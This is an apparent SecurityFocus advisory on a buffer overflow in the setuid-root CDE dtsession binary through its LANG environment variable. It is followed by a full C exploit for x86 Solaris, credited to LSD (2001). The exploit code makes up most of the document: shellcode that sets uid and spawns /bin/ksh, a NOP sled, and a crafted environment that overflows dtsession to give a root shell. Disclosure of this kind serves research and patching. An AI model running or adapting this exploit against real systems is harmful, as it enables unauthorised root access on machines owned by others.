source: http://www.securityfocus.com/bid/2603/info

The CDE Session Manager 'dtsession' is vulnerable to a buffer overflow that could yield root privileges to an attacker.

The bug exists in dtsession's LANG environment variable parser. If an overly long LANG variable is set and dtsession is subsequently run, dtsession will overflow. Because the dtsession binary is setuid root, the overflow allows an attacker to execute arbitrary code as root.

An exploit is available against x86 Solaris installations of CDE. 

/*## copyright LAST STAGE OF DELIRIUM mar 2001 poland        *://lsd-pl.net/ #*/
/*## /usr/dt/bin/dtsession                                                   #*/

#define NOPNUM 6000
#define ADRNUM 400
#define PCHNUM 6000
#define JMPNUM 6000

char setuidshellcode[]=
    "\x33\xc0"             /* xorl    %eax,%eax              */
    "\xeb\x08"             /* jmp     <setuidshellcode+12>   */
    "\x5f"                 /* popl    %edi                   */
    "\x47"                 /* incl    %edi                   */
    "\xab"                 /* stosl   %eax,%es:(%edi)        */
    "\x88\x47\x01"         /* movb    %al,0x1(%edi)          */
    "\xeb\x0d"             /* jmp     <setuidshellcode+25>   */
    "\xe8\xf3\xff\xff\xff" /* call    <setuidshellcode+4>    */
    "\x9a\xff\xff\xff\xff"
    "\x07\xff"
    "\xc3"                 /* ret                            */
    "\x33\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\xb0\x17"             /* movb    $0x17,%al              */
    "\xe8\xee\xff\xff\xff" /* call    <setuidshellcode+17>   */
    "\xeb\x16"             /* jmp     <setuidshellcode+59>   */
    "\x33\xd2"             /* xorl    %edx,%edx              */
    "\x58"                 /* popl    %eax                   */
    "\x8d\x78\x14"         /* leal    0x14(%eax),edi         */
    "\x52"                 /* pushl   %edx                   */
    "\x57"                 /* pushl   %edi                   */
    "\x50"                 /* pushl   %eax                   */
    "\xab"                 /* stosl   %eax,%es:(%edi)        */
    "\x92"                 /* xchgl   %eax,%edx              */
    "\xab"                 /* stosl   %eax,%es:(%edi)        */
    "\x88\x42\x08"         /* movb    %al,0x7(%edx)          */
    "\xb0\x3b"             /* movb    $0x3b,%al              */
    "\xe8\xd6\xff\xff\xff" /* call    <setuidshellcode+17>   */
    "\xe8\xe5\xff\xff\xff" /* call    <setuidshellcode+37>   */
    "/bin/ksh"
;

char jump[]=
    "\x8b\xc4"             /* movl    %esp,%eax              */
    "\xc3"                 /* ret                            */
;

main(int argc,char **argv){
    char buffer[20000],*b,adr[4],pch[4],jmp[4],*envp[4],display[128];
    unsigned int i;

    printf("copyright LAST STAGE OF DELIRIUM mar 2001 poland  //lsd-pl.net/\n");
    printf("/usr/dt/bin/dtsession for solaris 2.7 (2.6,2.8 ?) x86\n\n");

    if(argc!=2){
        printf("usage: %s xserver:display\n",argv[0]);
        exit(-1);
    }

    *((unsigned int*)adr)=((*(unsigned int(*)())jump)())+3540+3000-0x4d0;
    *((unsigned int*)pch)=((*(unsigned int(*)())jump)())+3540+3000+6000;
    *((unsigned int*)jmp)=((*(unsigned int(*)())jump)())+3540+3000+6000+6000;

    *((unsigned int*)adr)=(((i=*((unsigned int*)adr))>>8))|(i<<24);

    sprintf(display,"DISPLAY=%s",argv[1]);
    envp[0]=&buffer[0];
    envp[1]=&buffer[19000];
    envp[2]=display;
    envp[3]=0;

    b=buffer;
    sprintf(b,"xxx=");
    b+=4;
    for(i=0;i<PCHNUM;i++) *b++=pch[i%4];
    for(i=0;i<JMPNUM;i++) *b++=jmp[i%4];
    for(i=0;i<NOPNUM;i++) *b++=0x90;
    for(i=0;i<strlen(setuidshellcode);i++) *b++=setuidshellcode[i];
    *b=0;

    b=&buffer[19000];
    sprintf(b,"LANG=");
    b+=5;
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    *b=0;

    execle("/usr/dt/bin/dtsession","lsd",0,envp);
}